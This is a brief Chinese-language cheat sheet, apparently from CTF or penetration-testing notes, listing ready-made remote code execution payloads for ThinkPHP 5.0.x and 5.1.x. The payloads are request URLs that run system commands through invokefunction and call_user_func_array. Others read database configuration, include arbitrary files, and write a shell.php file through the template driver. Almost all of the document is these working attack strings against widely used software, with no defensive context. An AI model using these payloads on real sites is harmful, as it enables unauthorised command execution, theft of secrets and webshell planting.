# Thinkphp——RCE

---

总结：3和5都有

https://www.cnblogs.com/0xdd/p/11102426.html

## Thinkphp3





## Thinkphp5

index模块要存在，如果不存在就看哪个模块存在进行替换（如：home、admin  {s=home、s=admin}）

总结：

```
https://www.cnblogs.com/Mikasa-Ackerman/p/ThinkPhp-zhiRce-fen-xi.html
```

Thinkphp 5.0.7

```
/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat+/flag
```

Thinkphp 5.0.x

```
/index.php?s=index/think\config/get&name=database.username // 获取配置信息
/index.php?s=index/\think\Lang/load&file=../../test.jpg    // 包含任意文件
/index.php?s=index/\think\Config/load&file=../../t.php     // 包含任意.php文件
/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
/index.php?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
```

Thinkphp 5.1.x

```
/index.php?s=index/\think\Request/input&filter[]=system&data=pwd
/index.php?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
/index.php?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

